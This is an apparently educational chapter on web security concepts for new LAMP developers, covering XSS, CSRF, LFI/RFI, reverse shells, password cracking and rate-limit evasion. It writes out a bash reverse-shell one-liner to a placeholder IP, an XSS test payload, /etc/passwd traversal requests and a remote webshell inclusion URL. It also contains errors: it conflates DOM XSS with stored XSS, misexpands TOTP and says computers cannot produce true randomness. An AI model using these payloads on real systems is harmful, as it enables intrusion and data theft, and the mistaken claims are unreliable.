# Section 2: Web Security Concepts

## Web defacement
An unskilled attacker might find a way to modify a web page, and then edit it to say “[username] was here.” Maybe they’ll change it to have green text on a black background, and maybe include an edgy picture of a skull, Guy Fawkes mask, or someone wearing a mask at a computer. That’s called web defacement. A similar concept is someone recovering someone’s account on social media and then using it to post a message saying “hacked by [name].” Although it might seem scary to people who don’t know about security, web defacement is relatively tame. An actually concerning hack would be someone exfiltrating in such a way that they never get caught, rather than trying to immediately announce to the world that they found a security issue on a site or with someone’s account. People who do web defacement are usually young, unskilled, and just looking for attention. By contrast, a serious hacker doesn’t want any attention at all.

## Linux security
In addition to software like a web application firewall (such as ModSecurity), it can also be good to enable Linux security modules on a web server, such as seccomp, AppArmor, SELinux, Tomoyo, and Smack. Some security modules come with Linux by default, but others have to be manually enabled/configured. A kernel module is a module that can be added to the Linux kernel to provide additional functionality. Linux security modules (LSM) are modules whose sole purpose is to make the system more secure. 

In addition to LSM stuff, further security features to use in Linux are package signing, ASLR, grsecurity, and PaX. For a personal project website, like your first LAMP project in an AWS EC2 instance, you don't need to go overboard with security. You need to assess risks and threats. Who are adversaries who might want to attack you? How attractive are your digital assets to profit-oriented cybercriminals, politically-motivated hacktivists, or nation state groups (advanced persistent threats)? The answer to those considerations is called a threat model. It's true that many hackers will try to hack anyone and anything just to make a quick buck, you are still less likely to be hacked if you're a student making an educational project rather than a company that has a lot of customer payment information. 

When you're a new developer and only working on small-scale educational/personal projects, don't worry too much about LSM stuff. But when you get a job as a professional web developer, then you'll need to think about security more. That being said, depending on your infrastructure arrangement, someone else might be in charge of securing the underlying OS – or maybe not. 

Just understand that a web server will be subject to more attacks than your typical home computer, so additional safeguards are good. But at the same time, a fortune 500 company or a political whistleblower will need more security than a new software developer just making a personal website or demonstrative portfolio project. That doesn't mean you'll never get hacking attempts. It just means you'll face fewer of them, and the attacks against your sites will probably be low-hanging fruit, like SQL injection, CSRF, weak/reused credentials, XSS, and glaring security misconfigurations. I check my WAF logs for my Wordpress sites, and there are lots of unskilled attackers who give up after trying and failing to perform a very simple kind of attack. Some attacks are automated, but others are manual.

## Using software with known vulnerabilities

You can’t just set up a server or container and then leave it. An important part of web development is installing updates. The older software is, the more likely it is to have known vulnerabilities, and known tools or scripts that can be used to misuse the security issues. Equifax got hacked because they had a server running an old version of a program called Apache Struts, which had known vulnerabilities. If they just installed updates, they probably wouldn’t have been hacked.

If you use a CMS like Wordpress, people can use a tool called WPscan to scan it for vulnerabilities. There are exploits publicly available on the internet. Most hackers aren’t coming up with their own tools, vulnerability research, or exploits. They just use stuff other people made. It’s surprisingly easy.

**SQL injection** – when you have a form on your website, that input from the user will eventually be put into a database, such as for a signup form for making an account. But SQL injection is when someone tries to inject (put) SQL code into the form inputs, so that they can run queries that will allow them to see private data from a database that they’re not supposed to be able to see. Good ways to protect against SQL injection include parameterized queries and prepared statements.

**Second order SQL injection** – an indirect form of SQL injection.

**Reflected XSS** – a non-persistent form of cross-site scripting. XSS (cross-site scripting) is being able to add JavaScript to a page. In reflected XSS, the malicious JavaScript is only added to a web page if a user clicks on a maliciously-crafted link, which includes the normal url plus some additional stuff at the end for the XSS. XSS can be used for things like cookie stealing, among other things. But reflected XSS is the more tame variant of XSS, because it requires someone to click on a link that you send them.

Reflected XSS occurs when someone sends you a long link to a website and you click on it. The stuff at the end of the link is the XSS portion. It doesn't stay on the website itself. It only works maliciously if you click on that specific link. Reflected XSS is lower-impact, but can still be bad.

**DOM XSS** – the more nefarious type of cross-site scripting. DOM XSS is also called persistent XSS or stored XSS because it stays on a web page. DOM means Document Object Model, and it basically means the hierarchical HTML structure of a page, often represented with a tree data structure. Unlike reflected XSS, DOM XSS doesn’t need someone to click on a special link. Instead, you can put JavaScript into a web page and it will stay there. Something staying in malware and hacking is referred to as persistence. One example of DOM XSS is a guestbook page where users can leave a comment. A malicious user might try to put a <script> tag into their comment, rather than a benign one. If the site is vulnerable to DOM XSS, then their comment will run as JavaScript for anyone who visits the page, as opposed to just showing it as text. A way to protect against DOM XSS is to sanitize all user input.

If you make a website with a LAMP stack, and you make a php script that lets people upload comments, then make sure that you can’t put HTML in the comment and have it show up as HTML.

For example, if someone makes a comment like this:

```
<h1>this text is big</h1>
```

It should show up like this:

```
<h1>this text is big</h1>
```

But if you didn’t properly sanitize it, it could look like this:

# this text is big

That’s the basis of DOM XSS, but with JavaScript instead of a 1st level heading tag.

A common way people test for XSS vulnerabilities is with a simple alert().

alert() is a function in JavaScript that shows the user a pop-up message within the browser tab. So if you do alert('Hello'); then the user will see a message box that says Hello in it. An alert() box by itself can't be used for hacking. It's merely a test to see if you can run any JavaScript at all. From there, if an attacker's alert() went through, they will try more nefarious JavaScript.

Here is what people do for XSS:

```
<script>alert('XSS');</script>
```

But don't actually run that on a website. XSS is considered hacking and could get you in legal trouble. 

It's good to test your own code, on your own server or computer (that you fully own), before pushing it to your production server. But don't try doing XSS tests on other sites.

Here are some different ways of testing for XSS:

<https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec>

Some sites will use very rudimentary anti-XSS things that will stop a basic alert('XSS') from working, but won't stop other kinds of XSS.

When securing your site against XSS, it's possible that you might only be partially protected against it, even if you're making an active effort to stop it. It's the same with SQL injection, where there are many different ways to do SQL injection, and you might have only coded your software in a way that protects against some methods. Security is complicated. If security was easy, the media wouldn't be reporting big companies having data breaches all the time. There is no quick or easy solution to security. You need to spend time and effort in your code, test it, and research security vulnerabilities to be aware of the kinds of attacks hackers can and will make against your site.

**CSRF** – cross-site request forgery (CSRF) is when an attacker gets a victim to click on a link or load something like an <img> tag (such as within an email or web page) with a malicious query string. In the <img> example, the src attribute would have a value of a URL with said malicious query string. Yes, you can get compromised just by clicking a link or visiting a website. You can even be compromised if you enable images in your email client. However, there are ways to protect against CSRF, such as with CSRF tokens. 

If you make an update_password.php page, such as example.com/update_password.php, then if a user wants to update it, a very simple way of doing it would be with a query string, like so:

```
example.com/update_password.php?newPassword=hunter2
```

But what if someone sent you that link? If you clicked on it, it would update your password. you probably wouldn't deliberately click on a password reset link, but what if someone put it in an html tag in an email, in a less obvious way?

CSRF tokens are randomly-generated tokens that protect users from CSRF attacks. With CSRF tokens, an action will only happen if the CSRF token is valid, in addition to the user being logged in. Without CSRF tokens, a query will run if they load the site with the CSRF query string (such as if they’re tricked into clicking a link or load an image with the CSRF query string in the src attribute), whether the user wanted it to run or not.

Forms can have hidden fields for HTML/PHP. To protect against CSRF, use an anti-CSRF token and a hidden field.

**Lack of Subresource Integrity (SRI) for third party JavaScript** – if you are like many web developers who use a JavaScript framework, especially for front-end stuff like Vue/Bootstrap/jQuery, then you might opt for simply embedding a .js file from a remote location, like so:

```
<script src="example.com/framework.js"></script>
```

Using a framework from a third party can be faster, as it might be cached in RAM and/or with a CDN, rather than loading it from your server’s hard drive/SSD. It also means less stuff to store on your own server. However, one drawback of this method (using a .js file on someone else’s server) is that a hacker could hack the server and modify the JavaScript file in a malicious way. So even if you trust the developer, they might not be the one who’s changing it in a malicious way. Someone could just compromise their site and change it without the developer’s knowledge or permission. But one way to stop this is with SRI verification. Subresource integrity is like a checksum. If two files are different, they should, in theory, have different checksums. There are occasional checksum collisions, but they are super rare. For all intents and purposes, checksum verification verifies if a file has not been tampered. So you can do something like this instead:

```
<script src="example.com/framework.js" integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"></script>
```

**Authentication bypass** – why bother trying to find someone’s username and password if you can just bypass authentication entirely? In other words, a way to access stuff that should only be accessible by authenticated users, but without the need to actually submit a login attempt with the correct username and password. There are many different ways to achieve this.

**Directory enumeration** – just because you don’t specifically have a link to something on your website’s web pages doesn’t mean someone can’t find it. If you have a file in your htdocs folder on a LAMP server, called not_linked_to.php, then it is accessible at example.com/not_linked_to.php even if there aren’t any links to it. You can have folders and files that aren’t linked to anywhere, but people can still find them. Rather than doing it manually, there are tools for directory enumeration, such as Dirbuster.

**Port scanning and service scanning** – a web server can have services running on it. If a hacker wants to hack a server, they first have to know what it’s running. A port scan will show which ports are open. A service scan will show what software is running on a server. From there, a hacker can look up vulnerabilities and exploits for the software that is on the server. nmap is a well-known scanning tool.

**robots.txt** – a hacker might look at a robots.txt file to find potentially interesting assets on a website. If you don’t want Google to index them, then maybe they’re valuable or private in some way.

**Misconfigured file/directory permissions** – be careful with chmod. You can accidentally mess things up. File and directory permissions are very important. This falls under the umbrella category of “misconfigurations.” As in, user error rather than some super advanced exploit or zero-day. Don’t make it easy for people to hack your site.

**Lack of 2FA** – it’s harder to code 2-factor authentication support for your website, but it’s well worth the effort. And you don’t have to start from scratch, either. But if you use a CMS such as Wordpress, you can just install a plugin that takes care of it for you. Or if you’re just doing LAMP stuff, you can look through Composer’s packages here: https://packagist.org/?query=2fa

It doesn’t make sense to try and make a complicated thing like 2FA from scratch. Just be careful about which packages you install. It helps to google the package name, who created it, see how many other people use it, etc. 

There are two main types of 2FA: SMS and TOTP. SMS is text messages, but TOTP means Time-based One Time Pad. You’ll want to use TOTP. It’s more secure and also means you can just use an authenticator app rather than some sort of text messaging service to send texts for you. 

**Insufficient logging and monitoring** – logging server events is like a business having security cameras. It doesn’t stop crime, but it makes it easier to investigate. It can also deter it at least a little. Monitoring logs is like paying someone to look at screens of what’s happening from the security cameras. But instead of an employee, log monitoring might be software, or you might do it yourself (for solo stuff). But in a company, there will be people whose job is to monitor security/IT dashboards. Logging is important for incident response. Here’s the thing: hacking is a crime. If your site gets hacked, look through logs to see who did it. 

Finding out who is responsible for a hack is called attribution. Attribution isn’t always easy, but if you don’t do proper logging, then you’re making it even easier for people to get away with stuff. Log traffic to your site – IP addresses, requests, and things like that. Log who posts what. Log what people are doing on your server. It can help to also convert old logs to read-only, possibly rotating and moving stuff somewhere else, so that a hacker can’t delete logs that contain info about them and what they were doing.

Yes, hackers can use VPNs, Tor, or hacked servers/computers in order to hide their true IP address. But not everyone does that. Additionally, there’s more to logging than just IP addresses. You can look at user agents, cookies, sessions, accounts, or browser fingerprinting. 

Monitoring makes it easy to see when someone is up to no good, or even for non-security stuff, like something crashing or having performance issues. Logging is important for investigating hacking (incident response) and even for other stuff. 

**Incorrectly configured firewall** – if your firewall is set up wrong, that can make it easier to hack your server. If you become a full stack developer, you should have at least a basic understanding of firewalls, and more specifically, a commonly-used Linux firewall called iptables.

**Using default ports** – you can use SSH on the default port of 22, or you can change it to something else, if you want to make it harder (but not impossible) to find. Many port scanners will only scan a certain number of ports, like maybe select port numbers, or perhaps a range of 1-1024, as those are reserved for commonly-used things. Higher number ports, like 34567, might be for a user’s application, or just putting a commonly-used service on a non-standard port. Some people use port 8080 instead of 80 for HTTP. Many people doing port scans won’t scan all ports (1-65535), because it takes a long time. But scanning just 1024 ports is much faster. So moving SSH to a non-standard port might mean fewer people will find it and know that it exists, but just know that anyone who is patient enough can find it on your server if they scan all ports. Also, fun fact: port 0 isn’t really used for anything. 

Another note about firewalls: there are separate rules for inbound and outbound traffic. Usually, firewalls are extremely strict about unsolicited connections from the outside world. However, they usually let devices from within the firewall make pretty much any type of outbound connection. Inbound is called ingress and outbound is called egress. 

**Ingress**: from the outside world to the web server. Ingress is going in.

**Egress**: from the web server to the outside world. Egress is exiting.

A web server running something like Amazon Linux, CentOS, or Red Hat might have strict ingress and egress firewall rules. However, a home user will only have strict ingress rules, but lax egress ones. But even so, a reverse shell can still be possible on a web server using something like port 80.

Because of this difference in ingress and egress firewall rules, many hackers will opt to use a reverse shell, which will connect from a device to the hacker, rather than the other way around. Of course, establishing a reverse shell in this way requires specifying the hacker’s IP address, which can be used for incident response and investigation, which is why logging and monitoring are important. It might just be some intermediary server that the hacker is using, rather than their true IP address. But it can still be worth looking into anyway. If a hacker establishes a reverse shell on a Linux server, it might show up in a file called $HISTFILE, which is the shell history. However, they can get rid of it using the unset HISTFILE command. But there are other logs that a LAMP server will have.

**Exposing debug or error data to users** – stack traces, exceptions, and other error messages or debug info can be useful for developers who are writing a website’s code, but it’s very dangerous to make it public on your production server because errors can leak credentials and other detailed information. You don't want users to know the details of the software running on your server. The more someone knows about what's running on your server, the easier it is for them to find suitable vulnerabilities and exploits that are readily available on the internet.

So always disable debug features and error reporting stuff on your actual server that is internet-facing. Turn display_errors on in your php.ini in your dev and testing environments, but make sure it’s off in production. For more information about php.ini settings, check this out: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/PHP_Configuration_Cheat_Sheet.md

Turn off or suppress error messages (with @ in PHP) in production, and use separate config files instead of hard-coding credentials, but make sure your credential config files are not in a public folder like htdocs. Even a default 404 page or "index of" page can show info about Apache, such as the version number. Sometimes, you don’t even need to do a port scan to find out what server software a website is running. You can sometimes just go to example.com/asdadfsfg234wdfsdf and then it will show you a 404 page. Apache and Nginx have default 404 pages which will let the user see the name of the server program and the version of it, such as nginx/1.14.2.

On your development machine or a local VM on a hypervisor, it’s fine and actually useful for debugging and fixing your application. But you can’t let people on the internet see that stuff, because it can leak sensitive data, such as login credentials or info about the software running on the server. Patreon was hacked because they accidentally left debug features on in production. Don’t make the same mistake. 

Debug and error information is part of a larger category of security issues called “information disclosure” and it can also include things like an incorrectly configured AWS S3 Bucket that lets anyone see files that really ought to be private. 

**Incorrectly configured Apache server** – just like how your php.ini can be configured incorrectly, your Apache server can be set up wrong too. For more information about Apache security hardening, check out this site: https://www.apachecon.eu/

**Privilege escalation** – going from a normal user account to root. If someone can execute code even as an unprivileged account, they can look up the version of Linux that’s running on the server and then look and see if there are any local privilege escalation exploits for it. Rooting/jailbreaking phones are examples of privilege escalation. 

**Remote code execution** – if you can get a shell on a computer, such as by opening a terminal window on a computer and then typing in text commands, you can do pretty much anything on it. But what if I told you that there are ways of executing code on web servers too? Remote code execution, also known as RCE, is when you are able to execute code on a server, usually through a shell. In PHP, that could be accomplished through something like the shell_exec() built-in function. If someone’s PHP code is written poorly, it might take user input and then execute it as a command, or otherwise take some client-side thing and then accept it for the back-end. This is really bad. Never do that. In fact, shell_exec() is pretty much always a dangerous thing to use. That’s why hackers love it. There are many other types of RCE. And there is another type of code execution, which is a little less severe, called arbitrary code execution. Remote code execution is arbitrary code execution which is remote. But in arbitrary code execution (non-remote implied), you might have to be on a system already in order to execute code. What makes remote code execution sinister is that you can execute code remotely, rather than from the machine locally. 

If you combine remote code execution with local privilege escalation, you can do pretty much anything on a server. Remote code execution can allow you to do something like create a reverse shell, and from the reverse shell, you can find out what version of Linux the server is running, and then you can do privilege escalation so you can get a root shell, and then do whatever you want. Easier said than done though. But that’s the thing about security vulnerabilities: an individual security issue might not seem so bad, but most hacking involves combining multiple different security issues. 

Security researchers will often open calc.exe (the calculator) on Windows to demonstrate remote code execution. This is kind of like the Windows RCE equivalent to alert('XSS');.

**Reverse TCP listeners** – if you want to have a reverse shell (a shell which connects to you from the compromised web server), you first need to set up a reverse TCP listener, such as with netcat a.k.a. nc. A listener “listens” for incoming data. Once you have a listener set up, then you can execute code on the insecure server that will establish a reverse shell at a given IP address.

**Reverse shells** – if you’re on macOS, you can use iTerm2 or Terminal in order to run shell commands. You have a shell. It’s a text-based way of controlling a computer. On Windows, you can use Git Bash to use a bash shell. A shell is a very powerful tool on a computer. There are plenty of legitimate uses for them, and some bad uses. A reverse shell is a shell that an attacker can use to remotely control a server. 

Let’s say you’re a hacker and your IP address is 10.1.2.3, just as an example. And you have a netcat listener set up on port 80. This is what you’d do on the compromised server in order to establish a reverse shell:

```
bash -i >& /dev/tcp/10.1.2.3/80 0>&1
```

In many cases, a reverse shell will be from an unprivileged user account, or perhaps a service account, like from the apache user for the apache server. In that case, you won’t be able to run just any old command, since you don’t have root… not yet, at least. But even so, there are plenty of things that can be done with a reverse shell, with or without elevated privileges. 

If you get code execution on a server, such as if there’s a LAMP server with a remote file inclusion vulnerability and you include a web shell, you can then get a reverse shell, and from there, you can try and find a config file that’s used with a PHP script in order to interact with a database (or even just cat a .php script if the developer was lazy and hard-coded the credentials for the MySQL database), and then you can use those credentials to look at what’s in the database, and exfiltrate data using something like dnscat to make it less obvious that you’re exfiltrating data. Or, depending on how bad the security and monitoring on the server is, you might not even have to use dnscat, and instead you can just use a SELECT query and output it to a file, and then copy the file over using the reverse shell, maybe even something super primitive like cat and then just copying and pasting the shell output. From there, that data, such as from a users table, might either have payment info, or just login info. An attacker can use that info to log into accounts, or to sell it on the dark web for cryptocurrency. If the developer did their due diligence, they might have hashed passwords, and in that case, you’ll have to run a tool like Hashcat in order to crack the hashes before you can use them. Hashcat can run faster on a desktop with a dedicated graphics card. It’s computationally-intensive so I don’t recommend running it on a laptop. Hash cracking is also much slower with CPUs compared to GPUs. Hash-cracking is suitable for GPUs because of how easily parallelizable it is.

Some people will take the lazy way and just try logging into a phpMyAdmin login page on a server because they can directly view database stuff that way. I would know – I monitor my server logs, and see just how lazy and unskilled many attempted hackers are. In general, most people in life take the path of least resistance. That includes hacking. Instead of some elaborate exploit chain or zero-days, most people will try the easiest kinds of security issues, which many people refer to as low-hanging fruit.

Also, I just want to make it clear that I’m only explaining this stuff from a defensive/educational perspective. I am not encouraging anyone to do anything illegal. But in order to make your site safe from hackers, you have to understand what hackers do. 

**Post-exploitation** – getting a reverse shell is nice and all, but that’s just how to get on a computer at all. But what do you do after that? What you do after getting RCE or a shell is called post-exploitation. You can do things like pivoting (moving from one compromised device to another), privilege escalation, enumeration, data exfiltration, downloading files with wget, and more.

**phpMyAdmin** – a way to manage databases on a LAMP server. If your website is example.com, then the login page for phpMyAdmin will be something like example.com/phpmyadmin. If someone can log in successfully, then they can click the databases tab, then click on a database, then click on a table, such as users, and view all the rows in it. From there, they can click “check all” and then hit “export.” Then they click “go” and then their browser will prompt them to save a .sql file with the name of the table, such as users.sql. Alternatively, rows can be exported as CSV, which can be opened in Microsoft Excel. In any case, although phpMyAdmin can be useful for a developer or IT person, it can also be a liability. It’s something that is very valuable to hackers, but if you install software updates and use strong passwords for your database accounts, it should be okay. But just know that someone being able to use phpMyAdmin on your server is just as bad as SQL injection. 

Here’s how a lot of hacking works: someone will learn how to hack a certain type of software, usually a specific version of it. They will either look for misconfigurations, old versions with CVEs, default passwords, or whatever. Then, once they know how to do that kind of hack once, they will try to find other servers that have the same setup, and then do the same attack over and over again, but on different servers. It’s just like coding: if you can solve a problem once, you can solve it any number of times. In fact, some more sophisticated hackers might even write scripts to automate the process of finding and hacking sites that have the software/version/config that they learned how to exploit. 

**Directory traversal** – when someone goes to a directory they're not supposed to be able to access, such as example.com/blog.php?page=../../../../../etc/passwd.

**LFI** – local file inclusion. LFI is when you include a file that is already on a server in a PHP script that isn’t intended to be used with it. This can lead to something like being able to view something you’re not supposed to see, or being able to run a file that you uploaded as a PHP script.

Here are some examples:

```
example.com/view.php?file=../../../../../etc/passwd
```
In the above example, you get to see a sensitive file on the server.

Here’s another example:

```
example.com/view.php?file=../../../../../uploads/webshell.php
```

As you can see, file inclusion uses directory traversal (../../../ to go up many levels), though it’s more than just that. 

File inclusion vulnerabilities can be the result of poorly-used include() code in PHP, such as including something that a user specifies. A good way to protect against it is to be careful with how you use include() and to not use it with user input, such as from a form, like if a user gets to search for a file, or if there’s client-generated input to a form (which can be altered). 

As bad as LFI is, keep in mind that it’s limited to files that are already on the server. If the server lets you upload files, then you might be able to use your own file with an LFI vulnerability. However, there is a much worse type of file inclusion, called remote file inclusion.

**RFI** – remote file inclusion. With RFI, you can use a remote file with an inclusion vulnerability, like so:

```
example.com/view.php?file=maliciouswebsite.com/webshell.php
```
What’s happening in the above example is that the view.php script is including a remote file, and running it as PHP. That’s not good. The best way for hackers to exploit an RFI vulnerability is with a web shell, which allows an attacker to run shell commands from within a web browser. From a web shell, an attacker can then establish a reverse shell, and then try to do privilege escalation, snoop around for interesting files (with cd and ls), find database credentials in PHP scripts or config files, change settings, exfiltrate data, upload their own malicious PHP or JS files (using wget to download them and mv to move them), and so on.

RFI is easier to maliciously exploit than LFI. LFI can be good to get a private file from a site, such as /etc/passwd, but RFI makes it easier to run a web shell. 

Both LFI and RFI illustrate why include() can be dangerous if used with user input from a form submission. 

**/etc/passwd** – a file containing information about user accounts on a system. 

**/etc/shadow** – a file containing password hashes for all the users on the server. Both /etc/passwd and /etc/shadow are Linux concepts. If you are able to do local file inclusion on a server, you can learn about user accounts with /etc/passwd, but that’s not good enough by itself. You should also do LFI for /etc/shadow, and then use a hash-cracking tool such as Hashcat or John the Ripper in order to crack the password hash so that you can log in to the different accounts on the system. 

Some security professionals even have a dedicated Hashcat machine, which is a computer with lots of fast graphics cards. Because Hashcat runs faster on GPUs than CPUs, and hash-cracking can take a long time, having a dedicated hash-cracking machine with lots of high-end GPUs can save you a lot of time. For more information about the Hashcat program, check out the website here: https://hashcat.net/hashcat/

I’ve seen people make Hashcat machines with 8+ graphics cards in a single machine. If you want to build a Hashcat machine, it might be worth looking into some of the hardware that GPU cryptocurrency miners use (not ASICs), because they have a lot in common. There are special power supplies, computer cases, motherboards, and PCIe lane extenders that make it easier to cram a ton of GPUs into a single computer. For a Hashcat machine, the CPU, RAM, and SSD aren’t that important. What matters is having tons of GPUs.

**Using weak pseudorandom numbers** – let’s say your website uses random numbers for things. Maybe for a session token, anti-CSRF token, password reset links, or even randomly-generated passwords for users who don’t want to make their own. If your random numbers are not very random, then that puts your site at risk. In computing, there is really no such thing as true randomness. Instead, there is PRNG, which stands for Pseudo-Random Number Generators. But not all PRNG is equally good. Many languages have basic random number built-ins, but for serious stuff, you might want to look into a concept called “secure random” numbers. For example, Java has a class called SecureRandom. PHP has a function called random_bytes(), which you can read more about here: https://www.php.net/manual/en/function.random-bytes.php

True random numbers on a computer simply don’t exist. If someone says they know how to get true random numbers, that’s like someone saying they made a free energy (perpetual motion) machine. They’re either lying or confused. 

**Malvertising** – even if you write secure PHP code, and have a secure LAMP server, there are other ways you and your users can be compromised. If you run ads on your website, malvertising can be a problem. How web ads work is that a website will use some sort of advertising agency as a middle man between the website owners and people who want to advertise their content. Modern ads are targeted too. So unless you directly sell advertisements (which nobody really does anymore), you actually don’t know which ads are being displayed on your site when a user goes to it. It’s all based on their browsing history, tracking cookies, and other stuff that advertisers use in order to send them personalized ads. If you see a certain ad on a website, that doesn’t mean other people do. They’ll see ads that are more relevant for them. It’s kind of creepy, but that’s just how it is now. But here’s the really bad part: hackers can buy ads on websites and then use malvertising – malicious advertising – in order to hack users. One example of malvertising is the browser locker scam, which will stop you from closing the window, and has a pop-up that tells you that there’s something wrong with your device, and you need to call a number to get tech support. They will then tell you to install software so that they can control your computer and then they’ll pretend to get rid of some non-existent problem and then charge you money for it. Malvertising might also be used for trying to deliver other kinds of payloads, like for ransomware, which will encrypt the files on your device and then charge you money for the decryption key (which is why versioned, read-only backups are important).

**Lack of rate limiting** – if you have a bike lock and you forget the combination to unlock it, you can just try every combination. If it’s the kind of bike lock that has 4 numbers, you can just try from 0000 to 9999. It will take a while, sure. But if you’re patient enough, you can brute force the combination. The same is true for login systems. Someone can use a brute forcing program to try many different combinations of characters in order to try and log in to an account on your website… that is, unless you implement something called rate limiting. Rate limiting means how many failed login attempts someone can make before being locked out of attempting for a certain amount of time. So maybe you allow for 10 failed login attempts before ignoring that person’s login attempts for the next 24 hours. This makes it impractical for an attacker to try and brute force a password. fail2ban is a good rate limiting program.

**Dictionary attack** – when someone attempts to brute force a login using dictionary words, as opposed to every alphanumeric combination (like aaabd, aaabe, aaabf, aaabg, and so on). Dictionary attacks are much faster. This is why it’s important to have a more complex password, which uses a combination of uppercase, lowercase, letters, numbers, and maybe some punctuation. I’ve even heard some people say that they put emojis in their passwords now, though I don’t know if I can recommend that. 

That said, modern dictionary attacks don’t mean a regular English dictionary. They mean a password dictionary, using passwords from other data breaches, or commonly-used passwords, like password123, even though it’s not a word in an English dictionary. But the point of using a dictionary attack as opposed to trying every single combination of characters is that it would take an impractical amount of time in order to try every combination, when instead you can just use the combinations that are commonly used or have been leaked from another site. That’s why it’s important to never reuse the same password on two sites: if one site gets hacked, hackers will use that email address and password on other websites too, because people are lazy about passwords and will sometimes use the same one for everything. This is why everyone should use a password manager. It makes it easy to have secure, unique passwords. 

**VPN rotation for circumventing rate limiting** – I currently pay a few bucks a month to use a VPN. With it, I can hide my real IP address from websites I visit. I can also change my IP to one of over 100 different IP addresses whenever I feel like it. The thing about rate limiting is that it’s based on an IP. In the previous example, I mentioned setting up rate limiting for 10 attempts per 24 hours, but what I failed to mention is that it’s 10 attempts every 24 hours per 1 IP address. So with a single VPN, I can multiply that by 100, for 1,000 password attempts per day. If an attacker only cares about getting more IP addresses rather than speed and customer support, they can use super cheap VPNs that only cost around $2 per month when they’re on sale, and using 10 cheap ones would be about $20 per month. So for $20 per month, someone can get 1,000 IP addresses, or 10,000 attempts per day, or 300,000 attempts per month, to log into an account on a website that supposedly has decent rate limiting. Suddenly, that 10 attempts per day doesn’t seem so little. Of course, it would be good to set up alerts in case of unusual server activity, like getting a high number of failed login attempts for a single account. But the point is that, the more IP addresses you have, the more able you are to brute force stuff, even when a site uses rate limiting.

There is a service similar to this concept called ProxyMesh, which lets you switch between many different IPs. But just keep in mind: if you use VPN rotation to illegally try and get into someone’s account, that VPN or proxy service might hand your information over to law enforcement. I’m not encouraging anyone to break the law, but I am explaining how bad people can use many different IPs to try and log into a site. Maybe someone will use Tor and then a VPN, and pay for the VPNs using credit cards they bought on a carding forum, in order to be harder to track down. Point being… rate limiting is important, but there are ways people can try to get around it.

There are tools you can use for brute forcing, or you can write your own software. A kind of easy but stupid way to automate this would be with AutoHotKey, Selenium, Java’s Robot class, or PyAutoGUI in Python.

**Violating the principle of least privilege** – the principle of least privilege means that, if something in your code doesn’t need permission to do something, you shouldn’t let it, because it just makes your code less secure. For example, using PHP to connect to a MySQL database using the root account rather than an unprivileged account. If you’re making a search function on your website, it doesn’t need the root account for the database. The root account has all privileges, meaning that if there’s a SQL injection issue, the attacker can do absolutely anything with it. But SQL injection with a limited mysql user account is less severe. Still bad, but not as bad as root. It’s common for developers to make service accounts rather than doing everything as root. Accounts in Linux are intended for users, but they are often used for software instead. One notable example of this is the user account called apache or www-data in Linux, if you have a LAMP server.

Violating the principle of least privilege means running things as root/administrator when you don’t actually need to. I once watched a very sloppy MongoDB video tutorial on Youtube, where they recommended that you install it and run it as root, despite warnings from MongoDB itself! This was a case of the blind leading the blind, which is common for tech tutorials on the internet.

The reason why people violate the principle of least privilege is because it’s easy and convenient. Instead of figuring out which permissions a file needs, you can just do chmod 777 and then it’ll work. So from the standpoint of a developer who is encountering a difficult issue, they might prioritize getting something to work over making sure it works securely. This is bad though. User accounts, file permissions, and more need to be configured with the principle of least privilege in mind. And in some cases, there might even be documents that tell you what permissions something needs, or even tools that can help you set the right permissions. 

Just keep in mind that, yes, your PHP code will still work if you use the root mysql user account, but that doesn’t mean it’s okay. Something working and something being secure are two different things. Also, keep in mind that the MySQL root user and the Linux root user are two separate things. But what they both share in common is that they should be used sparingly. 

**Domain registrar security** – bad people can potentially point your users to a malicious site instead of your legitimate one by compromising your domain registrar account, such as through social engineering their customer support, or by sending you a phishing email, and then updating DNS to point your domain to a different server.

**Not using captcha and JS** – bad people absolutely HATE Google reCAPTCHA and JavaScript. If your site relies on these things, it will discourage them. If you ban VPNs and Tor, and also require Google reCAPTCHA and JavaScript in order for your site to work, then that will greatly reduce the number of undesirable people using your website. Now, here’s the thing – there are some legitimate criticisms and concerns of captcha, Google, and JS. And there are some legitimate reasons to use VPNs or Tor. But at the same time, bad people love Tor and hate captcha and JS. 

If someone wants to hack your site or post bad content, they will typically do so using Tor, and they’ll have JavaScript disabled in their browser.

**Deanonymization attacks** – not really hacking per se, but people who use Tor or VPNs can be revealed, mostly using JavaScript, which is why miscreants like to disable JavaScript in their browsers.

**Phishing and fake websites** – it doesn’t matter that you have a secure website if your users are falling for phishing emails that tell people to click a link that leads to a fake site that looks similar to your own and asks them to put their login info in, to verify or protect an account or something. It sounds stupid, but it works for a lot of people. Maybe your website is www.example.com, and someone else registers wwwexample.com. They’re separate domain names, which will point to different servers that can be owned by entirely different people, but they might fool people who aren’t really paying attention. 

**Predictable resource location** – it’s better to use random numbers or randomly-generated IDs rather than stuff that’s predictable. Have you ever forgotten your password on a website, then clicked “forgot password” and it sent you an email link? Look at the link. 

Here’s an example from a Reddit password reset email:

```
https://accounts.reddit.com/resetpassword/RANDOM?correlation_id=RANDOM&ref=password_reset&ref_campaign=password_reset&ref_source=email&v=RANDOM
```

I replaced the random tokens with the word RANDOM. But in this case, in order for someone to reset a password, they’d have to either click on the link that was sent to them via email, or guess super long base64 strings, which is very unlikely to happen. But if they used predictable stuff, then an attacker would be able to guess what the password reset link would be, and then reset other people’s passwords.
That’s just one of many examples of how resources shouldn’t be predictable.

**Data exfiltration** – taking private data away, such as if someone exports a table in a database and then saves the file. 

**MITM (and why SSL is important)** – Man In The Middle. An attacker between you and your destination, such as a web server. MITM is easier against traffic for a website that doesn’t use SSL. So if a site says http://example.com instead of https://example.com, it can be easier for people to do MITM attacks. 

**Denial of Service** – stopping someone from being able to use something. If someone overwhelms a web server with more traffic than it can handle, that’s an example of a DoS attack.

**Distributed Denial of Service (DDoS)** – a denial of service attack that is performed by many different machines, rather than just one. Many people misuse DDoS. Some people say DDoS when they really mean DoS. If there’s only one machine involved in trying to make a server unavailable, it’s DoS. If there are many machines overwhelming a web server with too much traffic, it’s DDoS.

DoS and DDoS attacks are the most boring and uneventful kinds of attacks. It’s just a temporary nuisance. Things like SQL injection, XSS, CSRF, LFI, RFI, RCE, and privesc are very serious. But DDoSing? Not a big deal. Nobody can get data from your database with DDoSing. All it means is that you can’t use a website for a while. For some reason, the media overhypes DDoSing, maybe because it’s easier for people to understand and see the consequences of. 

